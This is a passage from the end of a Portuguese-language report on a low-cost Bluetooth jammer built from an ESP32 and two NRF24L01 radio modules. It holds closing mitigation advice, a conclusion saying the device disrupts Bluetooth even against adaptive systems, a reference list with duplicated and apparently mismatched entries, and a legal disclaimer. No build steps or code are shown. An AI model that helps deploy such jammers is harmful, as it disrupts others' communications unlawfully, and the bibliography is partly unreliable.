- Utilizar bandas alternativas, como 5 GHz ou Sub-1 GHz, para comunicação redundante em caso de ataques à faixa de 2.4 GHz.

### **7. Segurança Física e Ambiental**
- Garantir que dispositivos operem em ambientes controlados, onde a probabilidade de ataques físicos ou interferência intencional seja minimizada.

---


## **Conclusão**

Este estudo demonstrou a eficácia de um dispositivo de baixo custo, construído com um ESP32 e dois módulos NRF24L01, para interromper comunicações Bluetooth. A combinação de saltos aleatórios, emissão contínua e lógica otimizada garantiu interferência significativa, mesmo contra sistemas adaptativos. No entanto, deve-se ressaltar que o uso de jammers é **`estritamente regulado`** e deve ser realizado apenas em ambientes controlados e autorizados.

---


## **Referências**
> Nota: Os links fornecidos são de fontes públicas ou acessíveis sob assinatura/licença acadêmica. Verifique sua disponibilidade em bibliotecas digitais ou com acesso institucional.


1. NORDIC SEMICONDUCTOR. **nRF24L01 Product Specification**. Disponível em: <https://infocenter.nordicsemi.com/pdf/nRF24L01P_PS_v1.0.pdf>. Acesso em: 23 dez. 2024.

2. BLUETOOTH SPECIAL INTEREST GROUP. **Bluetooth Core Specification 5.3**. Disponível em: <https://www.bluetooth.com/specifications/bluetooth-core-specification/>. Acesso em: 23 dez. 2024.

3. FCC. **Jammer Enforcement Policy**. Disponível em: <https://www.fcc.gov/general/jammer-enforcement>. Acesso em: 23 dez. 2024.

4. ANATEL. **Resolução nº 680/2017**. Disponível em: <https://www.gov.br/anatel/pt-br>. Acesso em: 23 dez. 2024.

5. IEEE. IEEE 802.11 Standards. IEEE Xplore Digital Library, 2020. Disponível em: <https://ieeexplore.ieee.org/document/7786995>. Acesso em: 23 dez. 2024.

6. BALAKRISHNAN, H.; PADMANABHAN, V. N. **Interference-Aware Wireless Networks**. Disponível em: <https://dl.acm.org/doi/10.1145/1159913.1159922>. Acesso em: 23 dez. 2024.

7. STUBER, G. L. Principles of Mobile Communication. Springer, 1996. ISBN: 9780792396985.

8. TMRH20. **RF24 Library Documentation**. Disponível em: <https://nrf24.github.io/RF24/>. Acesso em: 23 dez. 2024.

9. POZAR, D. M. Microwave Engineering. 4. ed. Wiley, 2011. ISBN: 9780470631553.

10. BALANIS, C. A. Antenna Theory: Analysis and Design. 4. ed. Wiley, 2016. ISBN: 9781118642061.

11. SINGH, S.; AHUJA, R. K. Design and Analysis of Wi-Fi Jammer Using Software Defined Radio. International Journal of Wireless Networks, 2017. Disponível em: <https://www.sciencedirect.com/science/article/pii/S1877050920303236>

12. XU, W.; MA, K.; TRAPPE, W. Jamming Sensor Networks: Attack and Defense Strategies. IEEE Network, 2005. Disponível em: <https://scholarcommons.sc.edu/cgi/viewcontent.cgi?article=1018&context=csce_facpub>. Acesso em: 23 dez. 2024.

13. WECKERT, J. Ethics and Information Technology: Interference in Networks. Springer, 2000. ISBN: 9781402087986.

14. Bluetooth SIG. Bluetooth Core Specification v5.3. Disponível em: <https://www.bluetooth.com/specifications/bluetooth-core-specification/>.

15. Stallings, W. Wireless Communications & Networks. 2ª ed. Pearson, 2005. ISBN: 978-0131918351.

16. Nordic Semiconductor. Bluetooth Low Energy Fundamentals. Disponível em: <https://www.nordicsemi.com/Products/Bluetooth-Low-Energy>. 

17. IEEE. IEEE 802.15.1 Standard for Wireless Medium Access Control (MAC) and Physical Layer (PHY) Specifications for Wireless Personal Area Networks (WPAN). Disponível em: <https://standards.ieee.org/standard/802_15_1-2005.html>. 

18. Ghosh, A., Rappaport, Next Generation Wireless LANs: 802.11n and 802.11ac. ISBN: 9781107016767.

19. Pozar, D. M. Microwave Engineering. 4ª ed. Wiley, 2011. ISBN: 9780470631553.

---

**Este projeto tem finalidade exclusivamente educacional. Usar um jammer em redes públicas é ilegal e sujeito a penalidades.**
